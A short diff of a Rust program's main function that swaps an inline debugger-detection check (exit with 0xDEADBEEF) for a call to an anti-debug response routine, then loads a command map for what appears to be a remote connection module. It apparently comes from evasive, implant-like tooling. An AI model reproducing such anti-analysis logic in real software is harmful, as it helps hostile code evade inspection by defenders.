@@ -36,10 +36,7 @@ async fn main() {
         return;
     }
 
-    if anti_debug::detect_debugging() {
-        eprintln!("Débogueur détecté ! Arrêt du programme.");
-        std::process::exit(0xDEADBEEF as u32 as i32);
-    }
+    anti_debug::anti_debug_response();
 
     if let Some(cmd_map) = poly::get_command_map() {
         let mapping = connexion::CommandMapping {
